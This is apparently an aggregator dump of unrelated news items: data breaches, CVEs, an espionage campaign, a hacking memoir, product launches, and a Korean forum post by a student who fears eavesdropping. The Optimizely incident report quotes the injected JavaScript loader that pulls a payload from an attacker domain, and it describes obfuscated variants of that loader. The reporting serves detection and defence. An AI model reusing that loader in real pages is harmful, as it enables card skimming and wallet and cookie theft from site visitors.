But when you stray from that happy path, the rough edges start surfacing, and there is no one getting a paycheck to smooth those out. Swift for Android/Windows/other-non-Apple-platform is in exactly that position: yes, it technically works, and yes, the language steering committees are committed to continuing the level of support they promised, but it will never be the same seamless experience as developing for iOS/watchOS/visionOS/whateverOS. This extends beyond the language and into the tooling: Skip enables you use Xcode to develop your apps in parallel for iOS and Android, but this has only been achieved in the face of Xcode’s constitutional hostility towards doing anything other than optimizing for their own first-party platforms.

If humanity were destined to continue creating software solely with their monkey brains and meat fingers, Swift would likely be the language I would have stuck with until the day I retired. But that isn’t the trajectory we are currently on. Barring such speculative calamities as “model collapse”, Butlerian Jihad, or Skynet, we have taken a turn in a new direction.

We software developers have collectively [as/de]cended to a plane where we now direct the computers to write our computer code, and these computers have decided that they really prefer computery languages over the humany languages. Humany languages are those designed to fit inside our wonderful…

items.title: Nissan says Oracle PeopleSoft break-in may have spilled payroll records, SSNs
items.content:
Nissan says Oracle PeopleSoft break-in may have spilled payroll records, SSNs

Carmaker points finger at an 'unknown' flaw as customer fallout continues

Nissan has joined the growing list of Oracle customers cleaning up after a cyberattack, warning employees that payroll records, bank details, Social Security numbers, and other personal data may have been stolen.

In a filing submitted to the California Attorney General on Friday, Nissan Americas said Oracle had informed it of "a cyber event" involving the personnel records of "hundreds of companies." The automaker said it later learned Nissan had been "specifically targeted" in the attack.

A notification sent to current and former employees, seen by The Register , says the company believes attackers accessed a haul of sensitive info, including contact and banking information; Social Security, Social Insurance, or other national identification numbers; financial and tax records; and dependent and beneficiary details.

Current and former employees in the US, Canada, Mexico, and Brazil may have been affected, although Nissan said it is still working to determine exactly whose information was exposed.

Nissan said it kicked off its incident response plan after learning of the intrusion, brought in outside security specialists, and has been working with Oracle while keeping law enforcement informed. It plans to offer affected individuals credit or dark web monitoring where available.

The company has also put a few extra locks on the payroll office. Employees can now access pay slips or update direct deposit details only from a corporate network or through a secure VPN, while Nissan adds extra identity checks before processing payroll requests.

The accompanying employee FAQ pins the incident on "an unknown vulnerability in Oracle's PeopleSoft software" and says the campaign is affecting "hundreds of companies and institutions." The document offers no clue as to what the vulnerability is, whether Oracle has patched it, or whether the compromised PeopleSoft environment was hosted by Oracle or by Nissan itself.

The disclosure lands just weeks after researchers linked the ShinyHunters extortion crew to a wave of attacks exploiting a PeopleSoft zero-day . More than 100 organizations and roughly 300 PeopleSoft instances were reportedly compromised before Oracle issued mitigation measures, with the gang claiming to have made off with HR, payroll, and other enterprise data.

Weak security means attackers could disable all of a city's public EV chargers

US regulator tells GM to hit the brakes on customer tracking

21K Nissan customers' data stolen in Red Hat raid

Porsche panic in Russia as pricey status symbols forget how to car

Oracle has said little publicly about the reported attacks and didn't respond to The Register's questions, even as organizations have continued to disclose being caught in the fallout.

Nissan has not confirmed that the incidents are connected, though its California filing lists the breach period as May 27 through June 9, broadly aligning with the previously reported timeline.

The carmaker didn't respond to questions about how many current and former employees are affected, when Oracle first notified it of the breach, and whether the compromise was limited to Oracle-managed systems. ®

items.title: World's Largest Brands Infected With Malware Via Optimizely
items.content:
On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock .

The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits . Crypto has already been stolen, with verified transactions to the attackers.

This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.

The important lesson here is that trusted JavaScript doesn't always remain trustworthy . A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.

Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.

Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js . The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript ( projectJS ): custom code the customer writes in their Optimizely dashboard, which runs on every page.

The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com , with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:

"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();

We saw three versions of the injected loader:

A plain <script> tag pointing at https://1688360.cc/track.js (most snippets).

The same URL hidden in base64 with atob() . A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time.

A full inline copy of the payload , which runs through eval if 1688360.cc is blocked.

Some customers serve their snippet from their own domain, such as opt.scheels.com/js/<id>.js or www.vodafone.com.au/js/<id>.js . Those were affected too, because the content comes from the same Optimizely project.

We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code.

온오프라인을 가리지 않고 무분별하게 벌어지는 각종 프라이버시 침해 및 스토킹과 이에 대한 예방, 방지 및 사후 대응, 더 나아가서 개인정보 탈취 및 감시용 스파이웨어, 스토커웨어, 바이러스, 원격 조종, 추적기 등 악성코드를 통한 해킹과 스토킹 등 개인정보 침해 공격 방지와 온오프라인 프라이버시 보호를 위한 각종 다양한 지식정보를 공유하는 갤러리입니다.

매니저가 장기간(최소 10일 이상) 부재 시 부재중으로 표시되며, 다른 이용자에게 매니저의 책임과 권한이 위임될 수 있습니다.

매니저의 부재로 인해 운영에 지장이 있다고 판단될 경우, 다른 이용자가 권한을 위임받아 마이너 갤러리를 운영할 수 있습니다.

위임 절차는 신고 게시판 > 분류 선택에 [매니저 위임]으로 위임받을 이용자가 직접 신청하면 진행됩니다. 검토 결과 운영에 적합하다고 판단되는 회원에게 매니저 권한을 위임하게 됩니다.

부매니저가 장기간(최소 10일 이상) 부재 시 부재중으로 표시되며, 매니저에 의해 해임될 수 있습니다.

제가 집에서 한 말이나 제 언니랑 한 말들을 학교 가면 다 알고있어요 그래서 제가 말한 내용이랑 똑같은 내용을 꼭 제가 들을 수 있을때 언급하고 남자애들 여자애들 할것없이 제가 안보이는 데에서 조금만 이상한 말 하면 비웃으면서 지나가요 ㅠ 제가 진짜 친구가 없어서 학교에서 한마디도 안하는 날들이 대부분인데 제가 언니랑 학교 구석에서 말한 내용이랑 집에서 혼잣말 한 내용들을 똑같이 언급한게 한두번이 아니에요 ㅠ 제가 그냥 내용만 겹치면 말을 않겠는데 제가 말했던 내용 언급하면서 꼭 제 이름도 한번씩 부르고 그래요 보통 사람들은 자기이름을 그렇게 말하면 기분나빠서 한번 돌아보기라도 하겠지만 저는 성격이 워낙 내성적이라 누가 비웃고 지나가거나 째려보거나 저 보면서 한숨쉬어도 아무말도 못하거든요 ㅠ 그래서 그냥 기분만 나쁜건데 이게 하루이틀 쌓이니까 너무 힘들더라고요 ㅠ 처음엔 저도 이게 정신이 약간 아픈건가 했는데 정신병 관련 영상도 다 보고 그랬는데 환청은 이런식으로 들리는게 아니라고 하더라고요 계속 날 비난하고 그런식으로 들리는건데 저는 그런게 전혀 아니라 제가 전날 했던 얘기들, 방금 쉬는시간에 학교 구석에서 나눈 얘기들을 자꾸 똑같이 언급하니까 미치겠어요 ㅠ 한두번 우연으로 겹치는게 아니라 계속 겹쳐요 진짜.. 그리고 애초에 제가 학교에서 말을 한마디도 안하는데 자꾸 저한테 그런 반응을 보인다는게 애초에 저한테 이상한 일이 일어난다는 반증 아닌가요? 그리고 걔네가 말했던걸 몇개를 말씀드려보면 제가 도청을 의심한 초기에 급식실에서 밥먹고있었는데 어떤 남자애가 “도청” 이러고 지나가는거에요 그리고 저희반 남자애가 제 언니 이동수업반이랑 같은 반인데 거기서 쉬는시간에 “도청기를 달고다녀 ㅋㅋㅋㅋ” 이랬다는거에요 진짜 이상하죠 저는 예전에 우울증 약을 먹은적이 있어서 정신이 막 무결점으로 건강한 편은 아니에요 근데 저희 언니는 그런적도 없고 교우관계도 좋고 진짜 정신이 건강하거든요 ㅠ 근데 저희 언니가 그런말을 들었다니깐 진짜 도청이 일어나는게 맞는거구나 생각했어요.. 그리고 또 있었던 일을 말씀드리면 이동수업 때 제 뒷쪽에서 남자애가 제 아버지 직업을 언급하면서 제 이름을 말하는거에요 이게 도청을 하지 않고서는 절대 알수가 없는 사실이거든요 ㅠ 또 “정신병ㅋㅋㅋ” 하면서 제 이름을 언급하는거에요 이것도 도청을 하지 않았다면 알수 없는거고요 더 말씀드릴 사례가 많은데 그러면 너무 길어져서 이정도만 말씀드릴게요 그래서 찾아보니까 머리에 붙일수 있는 초소형 도청기가 있다길래  제 언니가 제 머리를 샅샅이 뒤져줬거든요? 근데 그래도 아무것도 안나오더라고요 ㅠ 그리고 또 도청 탐지 업체를 알아보니까 금액이 너무 비싸서요 ㅠ 제가 고3인데 이런일을 당해서 너무 스트레스 받는데 방법이 없어서 정말 어떻게 해야될지 모르겠어요 안그래도 제가 여자애들이나 남자애들이 괴롭힐 소재가 많은 조용한 애거든요 ㅠ그래서 저를 지나칠때 꼭 한마디 끼얹고 지나가고 그래서 학교생활이 막 편한 그런애는 아닌데 학교에서 유일하게 맘놓고 말할 수 있는 언니랑 말하는 얘기를 다 알고있으니까 스트레스 받아서 공부 능력도 점점 떨어지는것같고 쨋든 걱정이 이만저만이 아니에요 어떡해야되죠 ㅠㅠ 제가 성격이 활발한 편도 아니고 집에 돈이 많지도 않아서 진짜 대학 잘가야되는데 걱정이에요ㅠㅠ 긴글 읽어주셔서 감사하고요 여기가 사생활 침해 관련한 갤러리니까 혹여나 저랑 비슷한 경험이 있으시거나 관련 지식이 있는 분은 제가 어떻게 해야하는건지 알려주시면 진짜진짜 감사드릴것같아요 많은 도움 부탁드려요 정말 방법 여러가지 찾아봐도 안되겠어서 여기다 글 남겨요

items.title_ko: CODESYS Automation Server Connector 경로 순회 취약점(CVE-2026-118498), CVSS 7.5
items.summary_ko: CODESYS Automation Server Connector가 서버가 제공한 파일 이름을 충분한 경로 순회 검사 없이 사용한다. 공격자는 악성 Automation Server를 사용자가 신뢰하게 하거나 중간자 공격을 수행해 엔지니어링 워크스테이션의 임의 위치에 파일을 쓸 수 있고, 이후 사용자 권한으로 임의 코드 실행까지 이어질 수 있다. CVSS 7.5(HIGH)이며 원격 악용 가능으로 표시되어 있다.
items.content_ko: CERTVDE가 공개한 취약점 정보다. CODESYS Automation Server Connector는 서버가 제공한 파일 이름을 경로 순회 검사를 충분히 하지 않고 사용한다. 인증되지 않은 원격 공격자가 악성 Automation Server를 조작하거나, 신뢰된 통신 채널에서 중간자 공격을 수행하면 이 취약점을 악용할 수 있다. 사용자가 악성 서버를 신뢰하도록 속이는 것도 조건에 포함된다. 공격에 성공하면 엔지니어링 워크스테이션의 임의 위치에 공격자가 만든 파일을 쓸 수 있고, 이후 사용자 권한으로 임의 코드를 실행할 수 있다. 공개 일시는 2026-11-17 09:10:47 UTC다.

items.title: Frame – 31.5" color ePaper display
items.content:

our 3rd release, a full color 31.5" ePaper display in a handmade wooden frame, is now available for pre-order. watch the short film:

the 1st batch is just ~470 units and i intend to ship at least a few by the end of 2026. most deliveries will happen early 2027. see logistics for more details or pre-order here .

in 2013 i founded ArtSpot. our vision was to give New Yorkers a bit of joy by exposing them to local art. we did this through informal agreements with dozens of cafes, small galleries, and restaurants. " let us curate art on your walls, get paid if someone buys it. "

and it worked. sort of. finding artists was easy, building the platform was easy. getting permission from venues was slow but straightforward. the problem was nobody actually bought the art. i remember the admin email notification that first time a piece was sold. it was a small painting of Janelle Monáe. the buyer was my friend, a gift to me. here it is, still in my possession.

anyway ArtSpot failed. five years later i paid back my investors (+ 13% interest). but the vision never went away. i love making and consuming art.

i probably say " the most popular feature request since launch is ______ " too often. after saying no (and yes) to so many requests, it's tough to keep count.

but with certainty, one of our strongest convictions was about color. TRMNL is not a television. it is not a clock. we avoid trying to do too much.

then grayscale happened . photos look great. art is possible. community member Clark debuted Jaws (yes the movie), 1 frame at a time .

which got us thinking... maybe we were wrong about color. maybe it aligns with our vision and just maybe, it makes it even bigger.

today i'm thrilled to bury the lede and announce Frame . it's a 31.5 inch full color ePaper display, enclosed in a hand made wooden body that we manufacture ourselves. yes, we opened our own woodworking shop a few miles from HQ. a closer look at the workshop is coming soon.

Frame gets all the same features as other TRMNL devices, with a few additional perks spanning both the web platform and the hardware itself. watch the short film or read along below.

often requested, always ignored, until now. Frame will update at specified moments of the day versus a relative "every N minutes" cadence. this reduces screen flicker while also extending the battery life and adding continuity to your schedule.

the internet is cool but totally unnecessary. Frame's microSD port lets you run devices completely offline with zero personal information reaching our servers.

like all TRMNL devices, a rechargeable battery is included (10-20k mAh available). but with Frame we added an extra USB-C port on the rear of the device, accessible with a small hole through the back panel for always-on connectivity.

some of my colleagues are snobs about ePaper dithering algorithms and LUTs (look-up tables). this is now your gain.

over the past few months we've been developing Lazarus, a color conversion engine that we think provides Frame the best color matching on the market for any Spectra 6 display. it's also coming soon to our 4-color device , and yes it will be open source for your own tuning pleasure.

Frame at Cafe Brûlée in LaGrange, Georgia

Hang Frame in portrait or landscape orientation without additional hardware, both are built-in and flush mounted. You can optionally buy or build your own kickstand.

we're negotiating with some of our favorite community developers to build more Frame-centric features. paying homage to ArtSpot , we just created a Local Art plugin where anyone can submit their work and even sell it through the TRMNL platform.

before TRMNL i spent 10 years in b2b software and knew nothing about making physical products for everyday people. nobody ever blasted me on reddit about injection mold flow lines or damaged UPS packages. at best i'd get a G2 review every…

items.title: Redict is deprecated
items.content:
I must unfortunately announce that Redict is officially deprecated, and Redict

I had hoped to rally the Redis diaspora around a copyleft initiative, to

protect ourselves from future rug-pulls, and made Redict to serve this purpose.

However, with the valkey project’s success, and Redis’s return to a copyleft

license, Redict was not able to build a sustainable community.

We recommend that Redict users switch to valkey , which

uses a permissive license but has better long-term prospects. We advise against

switching back to Redis; though it is once again open source, and copyleft, it

uses a contributor license agreement which will facilitate another rug-pull when

Switching to valkey is straightforward: if you install from your package

manager, simply install valkey and move your config file:

If you use containers, simply pull the valkey container instead and ensure that

it runs with the appropriate config file.

Thanks to everyone who has contributed to Redict, endorsed the fork as the

future of Redis, and switched to it on their own machines. We had a good run :)
items.title_ko: Redict, 공식 중단 발표
items.summary_ko: Redict 프로젝트가 공식적으로 중단되었다. Redis 사용자들을 카피레프트(copyleft) 라이선스 아래 결집하려던 목표였으나, valkey의 성공과 Redis의 카피레프트 라이선스 복귀 이후 지속 가능한 커뮤니티를 만들지 못했다. 사용자는 valkey로 옮길 것을 권장하며, 패키지 관리자 설치나 컨테이너 기준으로 전환은 간단하다고 설명한다.
items.content_ko: Redict 프로젝트는 공식적으로 중단(deprecated)되었다고 발표되었다. 이 프로젝트는 Redis 사용자들을 카피레프트 라이선스 아래 모아, 향후 러그풀(rug-pull)로부터 스스로를 보호하려는 목적으로 만들어졌다. 그러나 valkey 프로젝트가 성공을 거두었고 Redis가 다시 카피레프트 라이선스로 돌아오면서, Redict는 지속 가능한 커뮤니티를 만들지 못했다. 이에 Redict 사용자에게는 퍼미시브(permissive) 라이선스를 쓰지만 장기 전망이 더 나은 valkey로 옮길 것이 권장된다. Redis로 되돌아가는 것은 권장하지 않는데, Redis는 다시 오픈소스이자 카피레프트가 되었지만 기여자 라이선스 계약(CLA)을 사용하고 있어 향후 또 다른 러그풀이 가능하다는 이유다. 패키지 관리자로 설치했다면 valkey를 설치하고 설정 파일을 옮기면 되고, 컨테이너를 쓴다면 valkey 컨테이너를 받아 적절한 설정 파일로 실행하면 된다. 끝으로 Redict에 기여하고 이 포크를 Redis의 미래로 지지해 준 사람들에게 감사를 전한다.

items.title: Chinese Hackers Abused Google Workspace Rules to Steal Research and Defense Emails
items.content:
A China-linked espionage group hid inside North American medical, academic, and military research networks for more than a year, quietly stealing sensitive research and defense email.

The way in was a backdoor on their REDCap research servers that stole login credentials. The exfiltration was the unusual part: the attackers rewired the victims' own Google Workspace rules to copy any message matching their keywords to an inbox they controlled.

Google's Threat Intelligence Group (GTIG) laid out the campaign in a report published this week and attributes it with high confidence to a cluster it tracks as UNC6508.

The actor and its REDCap backdoor are not new names; Google first surfaced both in February , in a wider report on state-backed attacks against the defense sector. It did not name the victims, describing them only as multiple organizations across the US and Canada: clinical providers, academic centers, military health institutions, advocacy groups, and health regulators.

Google says it notified them and disrupted the group's infrastructure.

The entry point was REDCap (Research Electronic Data Capture), a web platform that hospitals and universities use to build and manage study databases. UNC6508 compromised externally facing REDCap servers.

Google has not pinned down the initial access vector, named a specific CVE, or listed the affected versions, though it saw the group probing older, vulnerable ones.

Around three months after getting in, the group deployed custom malware GTIG calls INFINITERED , which trojanizes REDCap's own system files and does three things.

The earliest known compromise dates to September 2023, with activity continuing through November 2025. Once on the server, UNC6508 ran internal reconnaissance and credential discovery, pulling database and service account credentials, then used those logins to move into the internal network and on to a domain administrator account.

Google does not spell out the exact path to that admin account. With admin rights, the group set up the exfiltration.

The exfiltration rode a feature that was already there. UNC6508 abused content compliance rules, a legitimate Google Workspace admin feature that scans mail for keywords and can copy or forward matching messages.

Similar features exist in other cloud mail suites. The group created a rule, misspelled "Patroit," that watched for nearly 150 keywords, search terms, and email addresses. When a message matched, Workspace silently BCC'd it to an attacker-controlled Gmail address, which Google has since disabled. No malware on the mail server, no separate exfiltration tool, no unusual network traffic. Just a built-in mail feature, turned to copy the organization's secrets to an inbox the attackers owned.

MITRE already catalogs email-forwarding-rule abuse as a known technique. What GTIG flags as new here is the use of domain content compliance rules to do it, a method it says it had not seen from a China-linked actor before.

The rule's keywords mapped to UNC6508's collection priorities: geo-strategic policy, military strategy and equipment, advanced technology including AI and uncrewed vehicles, offensive cyber programs, and medical research. One term stood out for its specificity, chikungunya , the mosquito-borne virus behind a 2025 outbreak in China's Guangdong province.

Start with REDCap. Patch externally facing servers and remove old versions outright, not just alongside the current build. REDCap lets legacy versions run side-by-side, and that is what enables downgrade attacks, where an attacker forces software back to a known-vulnerable release.

Then check the mail side. Review Workspace, or equivalent, content compliance and mail-forwarding rules for anything that BCCs or reroutes mail to outside addresses. Check admin audit logs for when rules changed, not just what they say now. Pull GTIG's published indicators and hunt for INFINITERED. items.title: Jensen Huang, Elizabeth Holmes, and America's most powerful religion.
items.content:
On Wednesday afternoon, I stood on the sixth floor of Saks Fifth Avenue in a $10,000 black grained-leather Tom Ford jacket, the uniform of Nvidia cofounder and chief executive Jensen Huang , while Joseph Rosenfeld, an image consultant to tech founders and financiers, sized me up. "The attitude of the garment," he said, "This guy's got the get-up-and-go. He's like, 'If I see it, I'm gonna fuck it.'"

The following morning, four days after he admitted to an affair, reportedly with an executive at an Nvidia customer whom US intelligence officials suspected of spying for China, and hours after The New York Times reported a second affair with an Nvidia executive who reports to him, the company announced that Huang, the most important businessman of the past decade, had resigned . Later on Thursday, Reuters reported that Huang had had an affair with a second employee. Rosenfeld told me the jacket's meaty zippers and "elegant weightiness" represented the "triumvirate of power, money, and sex" — a triumvirate that was Huang's armor until it became a weakness.

Consider the stack of load-bearing objects. The totemic jacket propped up Huang, who has said that his wife and daughter dress him. Huang propped up Nvidia, which had exactly one CEO in its 33 years and whose own filings flagged to shareholders that it was "highly dependent" on a small executive team — Huang had 60 direct reports and no direct successor . Nvidia, which reached a market capitalization of $5.8 trillion earlier this fall, props up the AI boom: It controls some 90% of the market for the chips that are essential for building the data centers that are the gray matter of AI's brain. And the AI boom has been propping up the American economy. Tug on that shiny leather from cows that had been pampered so well until it was time, and you might find out what was propping up everything.

Quick, quick: Name the current CEO of Walmart . Or ExxonMobil. Or UnitedHealth. Or CVS. Or Costco. Nearly all of the bosses of America's biggest non-tech companies are anonymous more or less by design. But then: Elon, Sam, Dario, Mark, Palmer , Jensen. With the most valuable and voluble tech founders, the prognosticators and progenitors of our future, just saying their first names, like Oprah or Jesus, conjures their companies, their vestments and iconography, their mantras and manifestos — cowboy hats and Aloha shirts, chains and chainsaws, swinging swords and swooping arms, smoking meats and smoking blunts with Joe Rogan. It's time to build. Move fast and break things. It's always Day One. It is right and just.

At the end of the 2010s, several publications wrote obituaries to the cult of the founder. We would learn, they wrote, from the fraud of Elizabeth Holmes and Theranos , Travis Kalanick and the superpumping of Uber, Adam Neumann and WeWork's "Cult of We," and we'd stop giving them unlimited power and treating them like gods. "We forgot that no matter how amazing these dudes seemed," Wired's Steven Levy wrote in 2019, "they were just human, with human frailties." He went on, "In the 2020s, new founders will also be pressed on a question they can no longer avoid by swerving their rollerblades: What can go wrong?"

A lot, it turns out. The cult of the founder wasn't just resurrected; it has become the most consequential religion in America, the one that our 401(k)s, our power grid, our foreign policy, the way we work and relate to one another, and, most recently, the future of the entire planet now quietly depend on. Jensen Huang was its most convincing saint, a generational computer scientist who made a generational bet and who led with generational gravitas and drive to dominate. His fall is a stress test of founder worship.

Huang's admirers behaved less like fans than like congregants. Mark Zuckerberg anointed him "the Taylor Swift of tech." CNBC's Jim Cramer named his dog Nvidia. Donald Trump called him "one of the most brilliant men" — and, last Sunday, after the first affair…

items.content_ko: 필자는 수요일 오후 Saks Fifth Avenue 6층에서 이미지 컨설턴트 조지프 로젠펠드와 함께 고가의 Tom Ford 재킷을 살펴보았다. 이 재킷은 젠슨 황의 상징적인 복장이었다. 로젠펠드는 재킷의 지퍼와 무게감이 '권력, 돈, 섹스의 삼위일체'를 뜻한다고 평했다. 그 다음 날 회사는 황이 사임했다고 발표했다. 불륜을 인정한 지 나흘 뒤이며, 뉴욕타임스가 자신에게 보고하는 Nvidia 임원과의 두 번째 불륜을 보도한 날이었다. 이후 로이터는 황이 두 번째 직원과도 관계를 가졌다고 보도했다. 필자는 이 삼위일체가 황의 갑옷이었지만 결국 약점이 되었다고 본다. 황이 아내와 딸이 자신의 옷을 골라준다고 말한 적이 있다는 점을 들어, 그의 이미지를 지탱하던 요소들을 짚는 에세이 성격의 글이다.

items.title: 파폭에서 넷플릭스 보는데 갑자기 새창으로 팔레스타인 관련 사이트 뜸
items.content:
온오프라인을 가리지 않고 무분별하게 벌어지는 각종 프라이버시 침해 및 스토킹과 이에 대한 예방, 방지 및 사후 대응, 더 나아가서 개인정보 탈취 및 감시용 스파이웨어, 스토커웨어, 바이러스, 원격 조종, 추적기 등 악성코드를 통한 해킹과 스토킹 등 개인정보 침해 공격 방지와 온오프라인 프라이버시 보호를 위한 각종 다양한 지식정보를 공유하는 갤러리입니다.

매니저가 장기간(최소 10일 이상) 부재 시 부재중으로 표시되며, 다른 이용자에게 매니저의 책임과 권한이 위임될 수 있습니다.

매니저의 부재로 인해 운영에 지장이 있다고 판단될 경우, 다른 이용자가 권한을 위임받아 마이너 갤러리를 운영할 수 있습니다.

위임 절차는 신고 게시판 > 분류 선택에 [매니저 위임]으로 위임받을 이용자가 직접 신청하면 진행됩니다. 검토 결과 운영에 적합하다고 판단되는 회원에게 매니저 권한을 위임하게 됩니다.

부매니저가 장기간(최소 10일 이상) 부재 시 부재중으로 표시되며, 매니저에 의해 해임될 수 있습니다.

식별 코드 기준으로 당일 글 10개, 댓글 20개 작성 시 대왕디시콘을 3일간 사용할 수 있습니다.

즐겨찾기 폴더 추가는 즐겨찾기 on 후 우측의 폴더 아이콘을 터치하여 추가할 수 있습니다.

개별 이미지들의 위치 변경, 삭제, 별칭 추가, 폴더명 변경을 할 수 있습니다

items.title: Jiff 1.0: A datetime library for Rust
items.content:
Jiff is a datetime library for Rust that encourages you to jump into the

pit of success . Jiff automatically handles many common problems related to

daylight saving time by putting time zone handling front and center into the

API. Jiff has already seen widespread adoption in the Rust ecosystem.

Jiff is pronounced like “gif” with a soft “g,” as in “gem.”

This blog announces the Jiff 1.0 release by giving a tour of its API.

Target audience : Rust programmers who need convenient datetime handling.

Locale Sensitive Formatting via ICU4X Integration

Jiff is already used in production in many projects: uv, Cargo, Starship, fd,

Nushell, mise, Jujutsu, uutils/coreutils and even as the basis for a Temporal

implementation in AWS LLRT. It is time to call it 1.0.

Unless some significant defect is found in Jiff’s API, my plan is to commit

to Jiff 1.0 indefinitely. This is important because the intent is for Jiff

to be an ecosystem building block that appears in the public API of other

libraries. This makes Jiff an attractive public dependency, which means

semver incompatible releases are likely to cause significant pain in the

ecosystem. They will not be made lightly.

To see a list of breaking changes between Jiff 0.2 and Jiff 1.0, please

intersection of a computer system’s concept of time and a human’s concept of

time. The prevailing notion of system time is Unix time . A human’s concept

of time is far more complex, but the most popular such model is the Gregorian

calendar coupled with either a 12-hour or 24-hour clock. At the core of every

datetime library rests some routine for converting between these concepts.

A datetime library typically provides much more than this. Indeed, datetime

handling has historically been very difficult . My own belief is

that the difficulty comes from poor modeling of the domain . Instead of

encapsulating the complexity inside a reusable bundle of code, many datetime

libraries pass some or all of the complexity on to its users. Jiff instead

tries hard to encapsulate the complexity and make it difficult for users to

do something wrong. ( Jiff is not the first to do this! )

In this section of the blog, we’ll do some very basic introductions.

I am loath to present a dictionary. However, the datetime domain is littered

with confusable terms, so I think it’s important to orient ourselves on a

shared vocabulary. I’ve kept this section as small as possible. (Some terms,

like “time zone,” are omitted here because they are best defined through

exploration in the sections that follow.)

Civil time : The time you see on your clock. And in general, the time that

the humans in your approximate geographic vicinity also see. That is, civil

time is a human coordinated agreement for communicating time in a particular

geographic region. Civil time is also known as: local time, plain time, naive

UTC : An abbreviation for Coordinated Universal Time ; it is a time

standard that serves as the basis for civil time around the world. It was

originally intended to roughly correspond to mean solar time .

TAI : An abbreviation for International Atomic Time ; it is a time standard

as measured by atomic clocks. It isn’t directly connected to mean solar time.

Leap second : An adjustment to TAI to bring it closer to mean solar time

Unix time : UTC, but ignoring leap seconds.

TAI and leap seconds won’t be a feature of this blog, but they are listed here

in order to convey the difference between Unix time and UTC.

items.title: Janet Reno was talking about my friend Coolio (computer criminal)
items.content:
AI disclosure: this story was written entirely by human hands, with AI doing proof-reading and light edits.

No, not the rapper Coolio, but rather Dennis M. Moran .

There I was, standing on the couch in my basement, pointing at the TV. Janet Reno is giving a press conference on CNN, vowing to bring these cyber terrorists to justice. My jaw is open, I’m laughing. I can’t believe it. She’s talking about my friend Dennis “Coolio” Moran, a 17-year-old.

We were the #goonies on EFNet. We broke off from #doom, following our friend chunkk, the legendary Doom player (I still haven’t seen The Goonies movie though). Some of these people are still very close friends and at the time they were much closer friends than anyone I had IRL since they were computer elite and my local friends were all llamas. Above all, we were still very teenage and very dumb.

They were fond of robotripping, since it was all the drugs teenagers could afford. As a suburban kid from Queens from a loving supportive family I knew drugs were bad and would sit this stuff out. I had a job at a dialup ISP in Manhattan called nyct.net as a FreeBSD sys admin. I was moving up in the world.

Others, not so much. The most extreme robotripper and psychonaut on #goonies was Coolio. He was also a lot of fun. He basically never spoke ill of anyone. Everyone loved him. Girls would fall for him just watching him say stuff on IRC over my shoulder.

He was also the poorest friend I’ve ever had. He grew up in Wolfeboro, New Hampshire. His mom wasn’t in his life and his dad was, as far as I knew, a decent fellow, though they struggled to make ends meet and he had lived out of a tent for a period of his life. People mostly sort their friends and they get a picture of the world that’s very curated. Dennis (and indeed the rest of IRC) was my window out of my Queens NY bubble.

We did eventually hang out IRL. Dennis came to visit me in NYC and we went to Mindless Self Indulgence shows together, which were insanely fun. After one of them the (freakishly tall) lead singer Little Jimmy Urine was offering kisses for $5 (“VD free”). Dennis offered $20 over the heads of a bunch of clawing girls and he and Jimmy Urine made out.

When he wasn’t talking about drugs or girls, he was talking about hacking. We were all dabbling in computer stuff. We loved Doom and Quake and we had aspirations about becoming game developers. I bought a book on C and installed DJGPP and was trying my best to learn, but lost interest in games and pivoted to networks and coding on Linux. And also hacking. Though it had been out for years, I had just caught up with that Phrack article about Smashing the Stack for Fun and Profit and was curious about how to apply it. Dennis was interested too, and we thought about how cool it’d be to write a PoC exploit together.

Dennis found out about a BIND vulnerability with no PoC. We wrote one together. It worked! We were pumped. I thought we should promote internet health by publishing the PoC, since that was how you got people to fix bugs in those days. Dennis goes quiet for a few days. Then he comes back. Bro had been busy, he hacked into all of the vulnerable servers and recruited them into an insane botnet. I was shocked. WTF was he going to do with this? I thought we were just learning and there he goes hacking into half of the DNS servers on the internet! At least he patched BIND for them afterwards.

Dennis reads about the CD Universe extortion attempt and sees a business idea. What if he combines his botnet with smurfing to do massive DDoS attacks? Then he could threaten to knock sites offline if they didn’t pay. I thought this sounded crazy but he insisted on trying. His reasoning was you can’t just cold email executives out of nowhere and try to extort them. You gotta build up a reputation first. So he flexed his muscle and took down Yahoo!

He would say “watch this” and the sites would go down. First Yahoo, then buy.com and eBay, then etrade.com.

He picked buy.com…

items.title: HP Poly VoIP vulnerability sets the stage for executive voice deepfakes
items.content:
HP has released patches for a critical buffer overflow vulnerability in multiple IP-enabled conference phones from its Poly Voice line. The flaw allows unauthenticated attackers to obtain root privileges on the underlying operating system, potentially enabling them to execute other attacks such as eavesdropping on conversations and recording voice data for AI-enabled impersonation attacks.

The vulnerability, tracked as CVE-2026-0826 , was discovered by researchers from security firm Rapid7 and resides in the code that parses Session Description Protocol (SDP) attributes when the Interactive Connectivity Establishment (ICE) feature is enabled.

ICE enables VoIP devices to establish peer-to-peer connections using the shortest available network path. The feature is not enabled by default on HP Poly devices, and the company advises administrators to disable it if it’s not needed.

